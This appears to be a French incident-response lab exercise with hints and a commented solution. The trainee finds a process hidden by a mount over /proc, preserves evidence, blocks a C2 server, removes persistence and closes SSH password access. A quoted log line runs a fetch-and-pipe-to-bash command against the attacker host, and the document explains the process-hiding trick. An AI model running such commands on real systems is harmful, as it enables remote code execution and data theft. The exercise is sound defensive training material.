# 29. Le serveur parle à une adresse inconnue

## Le ticket

> **Ticket #4999, sécurité, priorité critique**
> L'IDS vient de lever deux alertes sur srv-prod-01 : une requête sortante de plus de 200 Ko vers 198.51.100.66 (port 443, en HTTP clair), puis un appel vers la même adresse toutes les cinq secondes. Sur le serveur, ni `ps`, ni `top`, ni `ss -p` ne montrent de processus suspect.
> L'équipe sécurité (CERT) prend l'enquête. Avant tout nettoyage, elle veut dans `/srv/preuves` : une copie de ce que le processus malveillant exécute, l'extrait du journal qui montre l'intrusion, et un fichier `SHA256SUMS` des preuves.
> Ensuite : couper l'attaquant, retirer tout ce qu'il a laissé, et fermer la porte par laquelle il est entré. La reconstruction complète du serveur est prévue demain soir. D'ici là, la boutique reste en ligne.
> Les netns `routeur`, `attaquant` et `c2`, et les unités `lab-*`, simulent Internet : n'y touche pas.

## Impact business

Un attaquant a la main sur le serveur de production, et la requête de 200 Ko ressemble à une fuite de données. S'il s'agit de données clients, la boutique a 72 heures pour prévenir la CNIL, et doit pouvoir dire quoi, depuis quand et combien : sans preuves, la notification se fera à l'aveugle. Un nettoyage précipité efface ces réponses, et un nettoyage incomplet laisse l'attaquant revenir avant la reconstruction.

## Les enjeux

- Trouver un processus que les outils habituels ne montrent pas.
- Préserver les preuves avant qu'un geste de nettoyage ne les détruise.
- Couper l'attaquant sans couper la boutique.
- Retirer toutes les persistances, pas seulement la première trouvée, sans casser ce qui est légitime.
- Fermer la porte d'entrée.

## Ce qui est vérifié

D'abord, les preuves, dans `/srv/preuves` :

- une copie du script exécuté par le processus caché (celle du processus vivant, pas celle qu'on retéléchargerait)
- l'extrait du journal qui montre l'intrusion
- un `SHA256SUMS` qui se vérifie

Puis :

- le serveur de contrôle est injoignable, et la boutique répond
- rien n'est caché sous `/proc`, aucune charge utile ne tourne, et plus aucun appel ne part
- plus d'unité malveillante, de tâche cron, de clé de l'attaquant, ni de compte d'UID 0 à part root
- la clé de l'admin, le compte deploy et la sauvegarde de nuit sont toujours là
- le mot de passe de deploy n'ouvre plus de session, depuis une autre adresse de l'attaquant

Si c'est bon, le check redémarre le serveur, attend 30 secondes, et vérifie que rien ne revient.

## Indices

<details><summary>Indice 1</summary>

`ps` ne montre pas le processus, mais ses enfants : regarde les `sleep` et les `curl`, et leur parent (`ps -eo pid,ppid,args`). Puis : qu'est-ce qui peut rendre un dossier de `/proc` vide ? `findmnt`.

</details>

<details><summary>Indice 2</summary>

Le fichier exécuté a été supprimé du disque. Un processus garde ouverts les fichiers qu'il utilise : `ls -l /proc/<pid>/fd`, `/proc/<pid>/exe`. Que se passe-t-il pour ces preuves si tu tues le processus ?

</details>

<details><summary>Indice 3</summary>

Les persistances classiques : unités systemd activées qu'aucun paquet ne fournit, `/etc/cron.d`, la crontab de chaque compte, les `authorized_keys`, les comptes d'UID 0. Et la porte d'entrée : `journalctl`, cherche « Accepted ».

</details>

## Démarche commentée

<details><summary>Voir la solution</summary>

```bash
ps -eo pid,ppid,args | grep -E 'sleep 5|curl' | grep -v grep   # un sleep 5, et son parent n'existe pas pour ps
findmnt -rn -o TARGET,SOURCE | grep '^/proc/[0-9]'             # /proc/430 tmpfs[/.font-unix/vide]
```

Un dossier vide est monté sur `/proc/430` : pour `ps`, `top` et `ss -p`, qui lisent `/proc`, ce processus n'a plus ni nom, ni fichiers, ni connexions. Ses enfants, eux, restent visibles. Avant de toucher au processus, on coupe l'attaquant : s'il garde la main, il peut voir l'enquête, tout effacer, ou réinfecter le serveur pendant le nettoyage. On bloque son serveur de contrôle et son adresse, sans toucher au reste du trafic, de façon à ce que le blocage tienne jusqu'à la reconstruction.

```bash
cat > /etc/nftables.conf <<'EOF'
#!/usr/sbin/nft -f
# Ticket #4999 : incident de sécurité. Serveur de contrôle et adresse de l'attaquant bloqués, jusqu'à la reconstruction.
flush ruleset

table inet confinement {
    set attaquant {
        type ipv4_addr
        elements = { 198.51.100.66, 203.0.113.66 }
    }
    chain entree {
        type filter hook input priority filter; policy accept;
        ip saddr @attaquant drop
    }
    chain sortie {
        type filter hook output priority filter; policy accept;
        ip daddr @attaquant drop
    }
}
EOF
systemctl enable --now nftables
curl -s -m 3 http://198.51.100.66:443/ || echo "serveur de contrôle injoignable"
```

Les preuves maintenant, et dans cet ordre : ce qui disparaît en premier d'abord. Le script et l'exécutable ont été supprimés du disque, ils n'existent plus que parce que le processus les tient ouverts. Le tuer d'abord, c'est perdre la seule copie de ce qu'il fait.

```bash
pid=$(findmnt -rn -o TARGET | sed -n 's|^/proc/\([0-9]*\)$|\1|p' | head -1)
umount /proc/"$pid"
ls -l /proc/"$pid"/exe                                     # /tmp/.font-unix/kdevtmpfsi (deleted)
ls -l /proc/"$pid"/fd | grep deleted                       # 255 -> /tmp/.font-unix/.s (deleted)
install -d -m 700 /srv/preuves
cd /srv/preuves
cp /proc/"$pid"/fd/255 script.sh
cp /proc/"$pid"/exe executable
tr '\0' '\n' < /proc/"$pid"/cmdline > cmdline.txt
tr '\0' '\n' < /proc/"$pid"/environ > environ.txt
ls -l /proc/"$pid"/fd /proc/"$pid"/cwd > fichiers-ouverts.txt
ps -eo pid,ppid,user,lstart,args --forest > processus.txt
ss -tanp > connexions.txt
journalctl --no-pager -o short-iso > journal.txt
grep -E 'Accepted password|COMMAND' journal.txt > journal-intrusion.txt
cat script.sh                                              # envoie clients.csv, puis appelle toutes les 5 s
cat journal-intrusion.txt
# Accepted password for deploy from 203.0.113.66 ...
# deploy : ... COMMAND=/usr/bin/bash -c 'curl -fsm 5 http://198.51.100.66:443/i.sh | bash'
```

Le script répond à la question de la CNIL : il a envoyé `/var/lib/boutique/clients.csv` au serveur de contrôle. Le journal donne l'entrée : le mot de passe de `deploy` deviné par SSH depuis 203.0.113.66, puis `sudo`, et un script téléchargé et exécuté en root. Ce script a pu tout faire : on cherche ce qu'il a laissé, et on le garde aussi en preuve avant de le retirer.

```bash
systemctl list-unit-files --state=enabled --no-pager | grep -v '^lab-'   # dbus-broker-sync.service
dpkg -S /etc/systemd/system/dbus-broker-sync.service      # aucun paquet ne la fournit
grep -rl 198.51.100.66 /etc /var/spool/cron                # l'unité, /etc/cron.d/sysstat-collect, la crontab de root
awk -F: '$3 == 0' /etc/passwd                              # root, et sys-update
systemctl cat dbus-broker-sync.service > persistance-unite.txt
cp /etc/cron.d/sysstat-collect persistance-cron.txt
crontab -l > persistance-crontab-root.txt
cp /root/.ssh/authorized_keys authorized_keys-root.txt
awk -F: '$3 == 0' /etc/passwd > comptes-uid0.txt
find . -type f ! -name SHA256SUMS -exec sha256sum {} + > SHA256SUMS
cd /
```

Les preuves sont figées. On arrête la charge utile, puis on retire chaque persistance, en épargnant ce qui est légitime : la clé de l'admin dans `/root/.ssh/authorized_keys`, la sauvegarde de nuit dans `/etc/cron.d`.

```bash
kill -9 "$pid"
rm -rf /tmp/.font-unix
systemctl disable dbus-broker-sync.service
rm /etc/systemd/system/dbus-broker-sync.service
systemctl daemon-reload
rm /etc/cron.d/sysstat-collect
crontab -r                                                 # la crontab de root ne contenait que la ligne de l'attaquant
sed -i '/sauvegarde@srv-prod-02/d' /root/.ssh/authorized_keys
userdel -f sys-update                                      # surtout pas -r : son dossier personnel est /root
```

Reste la porte d'entrée. Le mot de passe de `deploy` est connu de l'attaquant, et sshd accepte les mots de passe depuis Internet : bloquer 203.0.113.66 ne l'empêcherait pas de revenir d'ailleurs.

```bash
passwd -l deploy                                           # le mot de passe connu ne sert plus à rien
cat > /etc/ssh/sshd_config.d/10-cles-seulement.conf <<'EOF'
# Ticket #4999 : mot de passe de deploy deviné depuis Internet. Par SSH, des clés seulement.
PasswordAuthentication no
KbdInteractiveAuthentication no
EOF
sshd -t && systemctl reload ssh
```

Dernière vérification, celle du check : un redémarrage, et rien ne doit revenir. Ce nettoyage tient jusqu'à la reconstruction de demain : un serveur compromis en root ne redevient jamais sûr. L'attaquant a pu laisser ce qu'on n'a pas trouvé.

</details>

## Pourquoi cette approche

<details><summary>Voir la comparaison</summary>

- **Redémarrer le serveur** : la charge utile disparaît, avec tout ce qu'elle avait en mémoire, son script compris. Et les persistances la relancent au démarrage.
- **Tuer le processus, puis chercher** : la seule copie du script part avec lui. Plus moyen de dire à la CNIL ce qui est sorti.
- **Démonter `/proc/<pid>` sans avoir coupé le serveur de contrôle** : la tâche cron de l'attaquant voit que le processus n'est plus caché, et en relance un second.
- **Bloquer toute la sortie du serveur** : l'attaquant est coupé, et la boutique aussi (paiement, transporteur).
- **Supprimer la première persistance trouvée** : il en reste quatre. Une seule suffit pour revenir.
- **`userdel -r sys-update`** : son dossier personnel est `/root`.
- **Bloquer l'adresse de l'attaquant sans fermer la porte** : il revient d'une autre adresse, avec le même mot de passe.
- **Couper, prendre les preuves, arrêter, retirer, fermer, puis reconstruire** : chaque geste dans l'ordre où il ne détruit rien de ce qui reste utile.

</details>

## En prod

- Ordre de réponse : contenir, préserver, éradiquer, puis reconstruire. Les preuves volatiles d'abord : mémoire et processus, connexions, puis disque et journaux.
- Un processus invisible pour `ps` se cache souvent par `/proc` : montage sur `/proc/<pid>` (`findmnt`), bibliothèque dans `/etc/ld.so.preload`, module noyau. Ses enfants, ses connexions vues par le routeur, et le cgroup de son service (`/sys/fs/cgroup/.../cgroup.procs`) le trahissent.
- Un fichier supprimé mais ouvert se récupère par `/proc/<pid>/fd/` et `/proc/<pid>/exe`, tant que le processus vit.
- Persistances à passer en revue : unités systemd (`systemctl list-unit-files --state=enabled`, et `dpkg -S` pour savoir lesquelles viennent d'un paquet), cron (`/etc/crontab`, `/etc/cron.d`, `crontab -l -u` pour chaque compte), `authorized_keys` de chaque compte, comptes d'UID 0, `/etc/ld.so.preload`, `/etc/profile.d`, `rc.local`.
- Les empreintes (`SHA256SUMS`) au moment de la collecte montrent plus tard que les preuves n'ont pas bougé.
- Après une compromission en root : reconstruire depuis une image saine, et changer tout ce que le serveur connaissait (mots de passe, clés, accès aux bases et aux API).
